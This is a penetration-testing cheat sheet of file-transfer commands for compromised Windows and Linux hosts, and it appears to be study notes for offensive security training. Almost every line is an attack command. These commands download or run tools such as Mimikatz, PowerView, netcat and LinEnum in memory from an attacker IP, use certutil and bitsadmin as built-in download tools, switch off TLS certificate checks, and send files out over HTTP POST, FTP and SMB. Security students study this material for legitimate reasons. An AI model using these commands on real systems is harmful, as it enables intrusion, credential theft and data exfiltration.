| **Command** | **Description** |
| --------------|-------------------|
| `Invoke-WebRequest https://<IP>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
| `IEX (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |
| `Invoke-WebRequest -Uri http://<IP>:443 -Method POST -Body $b64` | Upload a file with PowerShell |
| `bitsadmin /transfer n http://<IP>/nc.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
| `certutil.exe -verifyctl -split -f http://<IP>/nc.exe` | Download a file using Certutil |
| `wget http://<IP>/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |
| `curl -o /tmp/LinEnum.sh http://<IP>/LinEnum.sh` | Download a file using cURL |
| `php -r '$file = file_get_contents("https://<IP>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download a file using PHP |
| `scp C:\Temp\bloodhound.zip user@<IP>:/tmp/bloodhound.zip` | Upload a file using SCP |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
| `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing \| IEX` | There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`. |

> Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:  
> `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`

# With SMB

create server
`impacket-smbserver -smb2support share .`

transfer  
`copy \\192.168.220.133\share\nc.exe`

New versions of Windows block unauthenticated guest access  

Create the SMB Server with a Username and Password  
`impacket-smbserver -smb2support share  . -user test -password test`  

Mount the SMB Server with Username and Password  
`net use n: \\192.168.220.133\share /user:test test`  
`copy n:\nc.exe`

# With FTP

Setting up a Python3 FTP Server  
`python3 -m pyftpdlib --port 21`

Transfering Files from an FTP Server Using PowerShell  
`(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`

FTP Uploads  
`sudo python3 -m pyftpdlib --port 21 --write`  

PowerShell Upload File  
`(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`

# Python - uploadserver
`python3 -m uploadserver`

and put file
`curl --form "file=@text.log" http://127.0.0.1:8000/upload`

# Python WebDav
`sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`

# Connecting to the Webdav Share
`dir \\192.168.49.128\DavWWWRoot`
